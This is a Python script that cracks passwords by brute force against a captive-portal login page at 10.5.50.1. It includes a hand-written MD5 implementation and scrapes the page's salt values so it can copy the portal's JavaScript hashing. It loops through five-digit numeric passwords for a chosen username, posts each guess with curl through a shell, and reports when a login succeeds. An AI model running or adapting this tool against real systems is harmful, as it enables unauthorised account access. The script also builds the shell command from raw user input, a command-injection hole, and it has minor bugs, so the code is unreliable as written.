import base64

def _safe_add(x: int, y: int) -> int:
    """Add integers, wrapping at 2^32."""
    return (x + y) & 0xFFFFFFFF


def _rol(num: int, cnt: int) -> int:
    """Bitwise rotate a 32-bit number to the left."""
    return ((num << cnt) | (num >> (32 - cnt))) & 0xFFFFFFFF

def _cmn(q: int, a: int, b: int, x: int, s: int, t: int) -> int:
    return _safe_add(_rol(_safe_add(_safe_add(a, q), _safe_add(x, t)), s), b)


def _ff(a, b, c, d, x, s, t):
    return _cmn((b & c) | ((~b & 0xFFFFFFFF) & d), a, b, x, s, t)

def _gg(a, b, c, d, x, s, t):
    return _cmn((b & d) | (c & (~d & 0xFFFFFFFF)), a, b, x, s, t)

def _hh(a, b, c, d, x, s, t):
    return _cmn(b ^ c ^ d, a, b, x, s, t)

def _ii(a, b, c, d, x, s, t):
    return _cmn(c ^ (b | (~d & 0xFFFFFFFF)), a, b, x, s, t)


def _core_md5(x):
    a =  0x67452301
    b =  0xEFCDAB89
    c =  0x98BADCFE
    d =  0x10325476

    for i in range(0, len(x), 16):
        aa, bb, cc, dd = a, b, c, d

        # Round 1
        a = _ff(a, b, c, d, x[i+ 0], 7 , 0xd76aa478)
        d = _ff(d, a, b, c, x[i+ 1], 12, 0xe8c7b756)
        c = _ff(c, d, a, b, x[i+ 2], 17, 0x242070db)
        b = _ff(b, c, d, a, x[i+ 3], 22, 0xc1bdceee)
        a = _ff(a, b, c, d, x[i+ 4], 7 , 0xf57c0faf)
        d = _ff(d, a, b, c, x[i+ 5], 12, 0x4787c62a)
        c = _ff(c, d, a, b, x[i+ 6], 17, 0xa8304613)
        b = _ff(b, c, d, a, x[i+ 7], 22, 0xfd469501)
        a = _ff(a, b, c, d, x[i+ 8], 7 , 0x698098d8)
        d = _ff(d, a, b, c, x[i+ 9], 12, 0x8b44f7af)
        c = _ff(c, d, a, b, x[i+10], 17, 0xffff5bb1)
        b = _ff(b, c, d, a, x[i+11], 22, 0x895cd7be)
        a = _ff(a, b, c, d, x[i+12], 7 , 0x6b901122)
        d = _ff(d, a, b, c, x[i+13], 12, 0xfd987193)
        c = _ff(c, d, a, b, x[i+14], 17, 0xa679438e)
        b = _ff(b, c, d, a, x[i+15], 22, 0x49b40821)

        # Round 2
        a = _gg(a, b, c, d, x[i+ 1], 5 , 0xf61e2562)
        d = _gg(d, a, b, c, x[i+ 6], 9 , 0xc040b340)
        c = _gg(c, d, a, b, x[i+11], 14, 0x265e5a51)
        b = _gg(b, c, d, a, x[i+ 0], 20, 0xe9b6c7aa)
        a = _gg(a, b, c, d, x[i+ 5], 5 , 0xd62f105d)
        d = _gg(d, a, b, c, x[i+10], 9 , 0x02441453)
        c = _gg(c, d, a, b, x[i+15], 14, 0xd8a1e681)
        b = _gg(b, c, d, a, x[i+ 4], 20, 0xe7d3fbc8)
        a = _gg(a, b, c, d, x[i+ 9], 5 , 0x21e1cde6)
        d = _gg(d, a, b, c, x[i+14], 9 , 0xc33707d6)
        c = _gg(c, d, a, b, x[i+ 3], 14, 0xf4d50d87)
        b = _gg(b, c, d, a, x[i+ 8], 20, 0x455a14ed)
        a = _gg(a, b, c, d, x[i+13], 5 , 0xa9e3e905)
        d = _gg(d, a, b, c, x[i+ 2], 9 , 0xfcefa3f8)
        c = _gg(c, d, a, b, x[i+ 7], 14, 0x676f02d9)
        b = _gg(b, c, d, a, x[i+12], 20, 0x8d2a4c8a)

        # Round 3
        a = _hh(a, b, c, d, x[i+ 5], 4 , 0xfffa3942)
        d = _hh(d, a, b, c, x[i+ 8], 11, 0x8771f681)
        c = _hh(c, d, a, b, x[i+11], 16, 0x6d9d6122)
        b = _hh(b, c, d, a, x[i+14], 23, 0xfde5380c)
        a = _hh(a, b, c, d, x[i+ 1], 4 , 0xa4beea44)
        d = _hh(d, a, b, c, x[i+ 4], 11, 0x4bdecfa9)
        c = _hh(c, d, a, b, x[i+ 7], 16, 0xf6bb4b60)
        b = _hh(b, c, d, a, x[i+10], 23, 0xbebfbc70)
        a = _hh(a, b, c, d, x[i+13], 4 , 0x289b7ec6)
        d = _hh(d, a, b, c, x[i+ 0], 11, 0xeaa127fa)
        c = _hh(c, d, a, b, x[i+ 3], 16, 0xd4ef3085)
        b = _hh(b, c, d, a, x[i+ 6], 23, 0x04881d05)
        a = _hh(a, b, c, d, x[i+ 9], 4 , 0xd9d4d039)
        d = _hh(d, a, b, c, x[i+12], 11, 0xe6db99e5)
        c = _hh(c, d, a, b, x[i+15], 16, 0x1fa27cf8)
        b = _hh(b, c, d, a, x[i+ 2], 23, 0xc4ac5665)

        # Round 4
        a = _ii(a, b, c, d, x[i+ 0], 6 , 0xf4292244)
        d = _ii(d, a, b, c, x[i+ 7], 10, 0x432aff97)
        c = _ii(c, d, a, b, x[i+14], 15, 0xab9423a7)
        b = _ii(b, c, d, a, x[i+ 5], 21, 0xfc93a039)
        a = _ii(a, b, c, d, x[i+12], 6 , 0x655b59c3)
        d = _ii(d, a, b, c, x[i+ 3], 10, 0x8f0ccc92)
        c = _ii(c, d, a, b, x[i+10], 15, 0xffeff47d)
        b = _ii(b, c, d, a, x[i+ 1], 21, 0x85845dd1)
        a = _ii(a, b, c, d, x[i+ 8], 6 , 0x6fa87e4f)
        d = _ii(d, a, b, c, x[i+15], 10, 0xfe2ce6e0)
        c = _ii(c, d, a, b, x[i+ 6], 15, 0xa3014314)
        b = _ii(b, c, d, a, x[i+13], 21, 0x4e0811a1)
        a = _ii(a, b, c, d, x[i+ 4], 6 , 0xf7537e82)
        d = _ii(d, a, b, c, x[i+11], 10, 0xbd3af235)
        c = _ii(c, d, a, b, x[i+ 2], 15, 0x2ad7d2bb)
        b = _ii(b, c, d, a, x[i+ 9], 21, 0xeb86d391)

        a = _safe_add(a, aa)
        b = _safe_add(b, bb)
        c = _safe_add(c, cc)
        d = _safe_add(d, dd)

    return [a, b, c, d]


def _str2binl(s: str) -> list:
    # Convert string to little-endian word array & pad
    nblk = ((len(s) + 8) >> 6) + 1
    blks = [0] * (nblk * 16)
    for i, ch in enumerate(s):
        blks[i >> 2] |= (ord(ch) & 0xFF) << ((i % 4) * 8)
    i = len(s)
    blks[i >> 2] |= 0x80 << ((i % 4) * 8)
    blks[nblk*16 - 2] = len(s) * 8
    return blks


def _strw2binl(s: str) -> list:
    # Wide-char string to little-endian words & pad
    nblk = ((len(s) + 4) >> 5) + 1
    blks = [0] * (nblk * 16)
    for i, ch in enumerate(s):
        blks[i >> 1] |= ord(ch) << ((i % 2) * 16)
    i = len(s)
    blks[i >> 1] |= 0x80 << ((i % 2) * 16)
    blks[nblk*16 - 2] = len(s) * 16
    return blks


def _binl2hex(binarray: list) -> str:
    hex_tab = "0123456789abcdef"
    s = []
    for i in range(len(binarray) * 4):
        byte = (binarray[i>>2] >> ((i%4)*8)) & 0xFF
        s.append(hex_tab[(byte >> 4) & 0xF])
        s.append(hex_tab[byte & 0xF])
    return ''.join(s)


def _binl2b64(binarray: list) -> str:
    # Convert to raw bytes
    raw = bytearray()
    for word in binarray:
        raw.extend(word.to_bytes(4, 'little'))
    return base64.b64encode(raw).decode()

# Public API
def hex_md5(s: str) -> str:
    return _binl2hex(_core_md5(_str2binl(s)))

def hex_md5w(s: str) -> str:
    return _binl2hex(_core_md5(_strw2binl(s)))

def b64_md5(s: str) -> str:
    return _binl2b64(_core_md5(_str2binl(s)))

def b64_md5w(s: str) -> str:
    return _binl2b64(_core_md5(_strw2binl(s)))

# Backward compatibility
calc_md5 = hex_md5


# everything above is related to encrypting md 5 (do not change) -- chatgpt 


def extract_hexmd5_parts(js_string):
        # get parameter from login site (function hexMD5(){})
        match = re.search(r"hexMD5\s*\(\s*(.*?)\s*\)", js_string, re.DOTALL)
        
        if not match:
            return None, None

        param = match.group(1).strip()

        # split to prefix suffix (+)
        parts = [p.strip() for p in param.split('+')]

        if len(parts) < 3:
            # not enough parts to extract prefix and suffix
            return None, None

        prefix = parts[0]
        suffix = parts[2]

        return prefix, suffix

def logout():
    return requests.get("http://10.5.50.1/logout")

import requests # as curl alternative (migration to faster_than_requests or curl needed - post time is absurd, therefore no point of making this)
import re # regex
import datetime
import subprocess

start_time = datetime.datetime.now()
print("Cracking started: "+start_time.strftime("%d-%m-%Y %H:%M:%S:%f"))

username = input("Username to brute-force: ") # user input

##START = (input("Give minimum password to start with (min: 10000): ")) # user input
##if START == "":
##    START = 1
## START = int(START)
START = 19090

##END = (input("Give max password to start with (max: 99999): ")) # user input
##if END == "":
##    END = 100000
##END = int(END)

END = 99999

for i in range(max(10000, START), min(END, 99999), 1):
    password = str(i)
    start_time_pass = datetime.datetime.now()

    url_login = 'http://10.5.50.1/login'
    requests_encrypt = requests.get(url_login)

    # get parameters to encrypt md5

    prefix, suffix = extract_hexmd5_parts(requests_encrypt.text)
          
    # print(prefix, suffix)

    if(prefix is None or suffix is None):
        # if failed to find prefix or suffix (this needs to be fixed according to the page 
        print("Already logged in.")
        logout = logout()
        print("Successfully logged out.")
        break

    # time offset
          
    time_offset = (datetime.datetime.now() - start_time_pass).total_seconds()*1000
    print(f"({password}): url extract done in " + str(round(time_offset, 2)) + "ms.")

    # remove '' at the beginning and end of each string

    prefix = prefix[1:-1]
    suffix = suffix[1:-1]

    pre_array = []
    suf_array = []

    # rozdziel \xxx i convert to chr() -- auto scales according to amount generated

    for i in range(0, len(prefix), 4):
        val = prefix[i+1] + prefix[i+2] + prefix[i+3]
        pre_array.append(chr(int(val, 8)))

    for i in range(0, len(suffix), 4):
        val = suffix[i+1] + suffix[i+2] + suffix[i+3]
        suf_array.append(chr(int(val, 8)))

    # print(pre_array) # debug purposes
    # print(suf_array) # debug purposes
 
    # print(''.join(pre_array) + password + ''.join(suf_array)) # debug purposes

    # generate md5 of prefix + password + suffix (matches js)
    
    hexa = hex_md5(''.join(pre_array) + password + ''.join(suf_array))

    # time offset
    
    time_offset2 = (datetime.datetime.now() - start_time_pass).total_seconds()*1000
    print(f"({password}): hexmd5 done in " + str(round(time_offset2 - time_offset, 2)) + "ms.")

    # print(hexa) # debug 

    # post data to login website - check if credentials are correct

####    r = requests.post(url_login, data7 =
####            {
####                "username" : username, # username str
####                "password" : hexa, # md5 version of pass
####            }
####        )

    cmd = (f"""curl -X POST -d "username={username}" -d "password={hexa}" http://10.5.50.1/login""")
    # print(cmd) # edebug
    response = subprocess.check_output(cmd, shell=True, text=True)
    
    # print(r.text) # debug

    # time offset

    time_offset = (datetime.datetime.now() - start_time_pass).total_seconds()*1000
    print(f"({password}): post url done in " + str(round(time_offset - time_offset2, 2)) + "ms.")

    # check if logged in

    if "You are logged in" in response:
        print(f"({password}): Login successful.")

        # program run time
        
        end_time = datetime.datetime.now()
        print(str(end_time - start_time))

        logout = logout()
        print("Logged out.")
        
        break
    else:
        print(f"({password}): Login failed. ")
